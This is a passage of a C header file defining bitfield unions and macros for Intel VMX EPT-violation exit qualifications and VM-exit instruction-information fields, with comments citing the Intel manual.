     * was executable. If that control is 1, this indicates whether the guest-physical address was
     * executable for supervisor-mode linear addresses.
     */
    UINT64 EptExecutable : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_BIT 5
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FLAG 0x20
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] If the "mode-based execute control" VM-execution control is 0, the value of this bit
     * is undefined. If that control is 1, this bit is the logical-AND of bit 10 in the EPT
     * paging-structures entries used to translate the guest-physical address of the access causing
     * the EPT violation. In this case, it indicates whether the guest-physical address was
     * executable for user-mode linear addresses.
     */
    UINT64 EptExecutableForUserMode : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_BIT 6
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_FLAG 0x40
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EPT_EXECUTABLE_FOR_USER_MODE(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Set if the guest linear-address field is valid. The guest linear-address field is
     * valid for all EPT violations except those resulting from an attempt to load the guest PDPTEs
     * as part of the execution of the MOV CR instruction.
     */
    UINT64 ValidGuestLinearAddress : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_BIT 7
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_FLAG 0x80
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_VALID_GUEST_LINEAR_ADDRESS(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] If bit 7 is 1:
     * - Set if the access causing the EPT violation is to a guest-physical address that is the
     * translation of a linear address.
     * - Clear if the access causing the EPT violation is to a paging-structure entry as part of a
     * page walk or the update of an accessed or dirty bit. Reserved if bit 7 is 0 (cleared to 0).
     */
    UINT64 CausedByTranslation : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_BIT 8
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_FLAG 0x100
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_CAUSED_BY_TRANSLATION(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] This bit is 0 if the linear address is a supervisor-mode linear address and 1 if it
     * is a user-mode linear address. Otherwise, this bit is undefined.
     *
     * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information
     * for EPT violations. (If CR0.PG = 0, the translation of every linear address is a user-mode
     * linear address and thus this bit will be 1.)
     */
    UINT64 UserModeLinearAddress : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_BIT 9
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_FLAG 0x200
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_USER_MODE_LINEAR_ADDRESS(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] This bit is 0 if paging translates the linear address to a read-only page and 1 if
     * it translates to a read/write page. Otherwise, this bit is undefined
     *
     * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information
     * for EPT violations. (If CR0.PG = 0, every linear address is read/write and thus this bit will
     * be 1.)
     */
    UINT64 ReadableWritablePage : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_BIT 10
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_FLAG 0x400
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_READABLE_WRITABLE_PAGE(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] This bit is 0 if paging translates the linear address to an executable page and 1 if
     * it translates to an execute-disable page. Otherwise, this bit is undefined.
     *
     * @remarks If bit 7 is 1, bit 8 is 1, and the processor supports advanced VM-exit information
     * for EPT violations. (If CR0.PG = 0, CR4.PAE = 0, or IA32_EFER.NXE = 0, every linear address
     * is executable and thus this bit will be 0.)
     */
    UINT64 ExecuteDisablePage : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_BIT 11
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_FLAG 0x800
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_EXECUTE_DISABLE_PAGE(_) (((_) >> 11) & 0x01)

    /**
     * [Bit 12] NMI unblocking due to IRET.
     */
    UINT64 NmiUnblocking : 1;
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_BIT 12
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_FLAG 0x1000
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING_MASK 0x01
#define VMX_EXIT_QUALIFICATION_EPT_VIOLATION_NMI_UNBLOCKING(_) (((_) >> 12) & 0x01)
    UINT64 Reserved1 : 51;
  };

  UINT64 Flags;
} VMX_EXIT_QUALIFICATION_EPT_VIOLATION;

/**
 * @}
 */

/**
 * @defgroup VMX_VMEXIT_INSTRUCTION_INFORMATION \
 *           Information for VM Exits Due to Instruction Execution
 *
 * Information for VM Exits Due to Instruction Execution.
 *
 * @see Vol3C[27.2.4(Information for VM Exits Due to Instruction Execution)] (reference)
 * @{
 */
/**
 * @brief VM-Exit Instruction-Information Field as Used for INS and OUTS
 */
typedef union {
  struct {
    UINT64 Reserved1 : 7;

    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used.
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)
    UINT64 Reserved2 : 5;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used. Undefined for VM exits due to execution of INS.
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)
    UINT64 Reserved3 : 46;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for INVEPT, INVPCID, and INVVPID
 */
typedef union {
  struct {
    /**
     * @brief Scaling
     *
     * [Bits 1:0] 0: no scaling
     * 1: scale by 2
     * 2: scale by 4
     * 3: scale by 8 (used only on processors that support Intel 64 architecture)
     * Undefined for instructions with no index register (bit 22 is set).
     */
    UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_BIT 0
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_FLAG 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING(_) (((_) >> 0) & 0x03)
    UINT64 Reserved1 : 5;

    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used.
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)
    UINT64 Reserved2 : 5;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used. Undefined for VM exits due to execution of INS.
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

    /**
     * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit
     * 22 is set).
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

    /**
     * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID(_) \
  (((_) >> 22) & 0x01)

    /**
     * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no
     * base register (bit 27 is set).
     */
    UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

    /**
     * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

    /**
     * [Bits 31:28] Reg2 (same encoding as IndexReg above).
     */
    UINT64 Register2 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_BIT 28
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_FLAG 0xF0000000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2(_) (((_) >> 28) & 0x0F)
    UINT64 Reserved3 : 32;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE;

/**
 * @brief VM-Exit Instruction-Information Field as Used for LIDT, LGDT, SIDT, or SGDT
 */
typedef union {
  struct {
    /**
     * @brief Scaling
     *
     * [Bits 1:0] 0: no scaling
     * 1: scale by 2
     * 2: scale by 4
     * 3: scale by 8 (used only on processors that support Intel 64 architecture)
     * Undefined for instructions with no index register (bit 22 is set).
     */
    UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_BIT 0
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_FLAG 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING(_) (((_) >> 0) & 0x03)
    UINT64 Reserved1 : 5;

    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used.
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)
    UINT64 Reserved2 : 1;

    /**
     * @brief Operand size
     *
     * [Bit 11] 0: 16-bit
     * 1: 32-bit
     * Undefined for VM exits from 64-bit mode.
     */
    UINT64 OperandSize : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_BIT 11
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_FLAG 0x800
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE(_) (((_) >> 11) & 0x01)
    UINT64 Reserved3 : 3;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used.
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

    /**
     * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit
     * 22 is set).
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER(_) \
  (((_) >> 18) & 0x0F)

    /**
     * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID(_) \
  (((_) >> 22) & 0x01)

    /**
     * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no
     * base register (bit 27 is set).
     */
    UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

    /**
     * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

    /**
     * @brief Instruction identity
     *
     * [Bits 29:28] 0: SGDT
     * 1: SIDT
     * 2: LGDT
     * 3: LIDT
     */
    UINT64 Instruction : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_BIT 28
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_FLAG 0x30000000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION(_) (((_) >> 28) & 0x03)
    UINT64 Reserved4 : 34;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for LLDT, LTR, SLDT, and STR
 */
typedef union {
  struct {
    /**
     * @brief Scaling
     *
     * [Bits 1:0] 0: no scaling
     * 1: scale by 2
     * 2: scale by 4
     * 3: scale by 8 (used only on processors that support Intel 64 architecture)
     * Undefined for instructions with no index register (bit 22 is set).
     */
    UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_BIT 0
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_FLAG 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING(_) (((_) >> 0) & 0x03)
    UINT64 Reserved1 : 1;

    /**
     * [Bits 6:3] Reg1. Undefined for memory instructions (bit 10 is clear).
     */
    UINT64 Reg1 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_BIT 3
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_FLAG 0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1(_) (((_) >> 3) & 0x0F)

    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used. Undefined for register instructions (bit 10 is set).
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)

    /**
     * [Bit 10] Mem/Reg (0 = memory; 1 = register).
     */
    UINT64 MemoryRegister : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_BIT 10
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_FLAG 0x400
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER(_) (((_) >> 10) & 0x01)
    UINT64 Reserved2 : 4;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used. Undefined for register instructions (bit 10 is set).
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

    /**
     * [Bits 21:18] General-purpose register. Undefined for register instructions (bit 10 is set)
     * and for memory instructions with no index register (bit 10 is clear and bit 22 is set).
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

    /**
     * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit
     * 10 is set).
     */
    UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID(_) \
  (((_) >> 22) & 0x01)

    /**
     * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for register instructions (bit 10
     * is set) and for memory instructions with no base register (bit 10 is clear and bit 27 is
     * set).
     */
    UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

    /**
     * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit
     * 10 is set).
     */
    UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

    /**
     * @brief Instruction identity
     *
     * [Bits 29:28] 0: SLDT
     * 1: STR
     * 2: LLDT
     * 3: LTR
     */
    UINT64 Instruction : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_BIT 28
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_FLAG 0x30000000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION(_) (((_) >> 28) & 0x03)
    UINT64 Reserved3 : 34;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for RDRAND and RDSEED
 */
typedef union {
  struct {
    UINT64 Reserved1 : 3;

    /**
     * [Bits 6:3] Destination register.
     */
    UINT64 DestinationRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_BIT 3
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_FLAG 0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER(_) (((_) >> 3) & 0x0F)
    UINT64 Reserved2 : 4;

    /**
     * @brief Operand size
     *
     * [Bits 12:11] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit
     * The value 3 is not used.
     */
    UINT64 OperandSize : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_BIT 11
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_FLAG 0x1800
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE(_) (((_) >> 11) & 0x03)
    UINT64 Reserved3 : 51;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED;

/**
 * @brief VM-Exit Instruction-Information Field as Used for VMCLEAR, VMPTRLD, VMPTRST, VMXON,
 * XRSTORS, and XSAVES
 */
typedef union {
  struct {
    /**
     * @brief Scaling
     *
     * [Bits 1:0] 0: no scaling
     * 1: scale by 2
     * 2: scale by 4
     * 3: scale by 8 (used only on processors that support Intel 64 architecture)
     * Undefined for instructions with no index register (bit 22 is set).
     */
    UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_BIT 0
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_FLAG 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING(_) (((_) >> 0) & 0x03)
    UINT64 Reserved1 : 5;

